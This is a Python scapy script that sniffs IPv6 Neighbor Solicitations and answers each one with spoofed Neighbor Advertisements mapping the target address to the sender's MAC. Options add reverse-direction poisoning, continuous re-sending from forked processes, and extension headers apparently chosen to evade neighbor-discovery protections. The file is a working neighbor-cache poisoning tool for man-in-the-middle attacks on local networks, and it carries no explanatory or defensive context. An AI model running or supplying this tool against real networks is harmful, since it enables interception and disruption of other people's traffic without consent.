import argparse
import os
import signal
import atexit
import time
import random
import scapy.all as sp
import scapy.layers.inet6 as inet6

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--iface')
parser.add_argument('-R', '--do-reverse', action='store_true')
parser.add_argument('-L', '--do-loop', action='store_true')
parser.add_argument('-F', '--do-frag', action='store_true')
parser.add_argument('-H', '--do-hbh', action='store_true')
parser.add_argument('-D', '--do-dst', action='store_true')
args = parser.parse_args()
iface = args.iface
do_reverse = args.do_reverse
do_loop = args.do_loop
do_frag = args.do_frag
do_hbh = args.do_hbh
do_dst = args.do_dst

if iface:
    sp.conf.iface = iface

childs = []


def kill_childs():
    for child in childs:
        try:
            os.kill(child, signal.SIGKILL)
        except:
            pass


if do_loop:
    atexit.register(kill_childs)


def prn(pkt):
    ippkt = pkt[inet6.IPv6]
    nspkt = ippkt[inet6.ICMPv6ND_NS]
    print(f'Spoofing to solicit {nspkt.tgt} from {ippkt.src}')

    p = sp.Ether(dst=pkt.src) / \
        inet6.IPv6(src=nspkt.tgt, dst=ippkt.src)
    if do_hbh:
        p /= inet6.IPv6ExtHdrHopByHop()
    if do_frag:
        p /= inet6.IPv6ExtHdrFragment(id=random.getrandbits(32))
    if do_dst:
        p /= inet6.IPv6ExtHdrDestOpt()
    p /= inet6.ICMPv6ND_NA(R=1, S=1, O=1, tgt=nspkt.tgt) / \
        inet6.ICMPv6NDOptDstLLAddr(lladdr=sp.conf.iface.mac)
    sp.sendp(p, verbose=0)

    pr = None
    if do_reverse:
        pr = sp.Ether(dst='33:33:00:00:00:01') / \
            inet6.IPv6(src=ippkt.src, dst=nspkt.tgt)
        if do_hbh:
            pr /= inet6.IPv6ExtHdrHopByHop()
        if do_frag:
            pr /= inet6.IPv6ExtHdrFragment(id=random.getrandbits(32))
        if do_dst:
            pr /= inet6.IPv6ExtHdrDestOpt()
        pr /= inet6.ICMPv6ND_NA(R=1, S=0, O=1, tgt=ippkt.src) / \
            inet6.ICMPv6NDOptDstLLAddr(lladdr=sp.conf.iface.mac)
        sp.sendp(pr, verbose=0)

    pid = os.fork()
    if pid == 0:
        time.sleep(0.0002)
        sp.sendp(p, verbose=0)
        if do_reverse:
            sp.sendp(pr, verbose=0)
        if do_loop:
            while True:
                time.sleep(5)
                sp.sendp(p, verbose=0)
                if do_reverse:
                    sp.sendp(pr, verbose=0)
    else:
        if do_loop:
            childs.append(pid)


filterstr = 'icmp6[icmp6type]==icmp6-neighborsolicit and not src ::'

sp.sniff(filter=filterstr, prn=prn, quiet=True)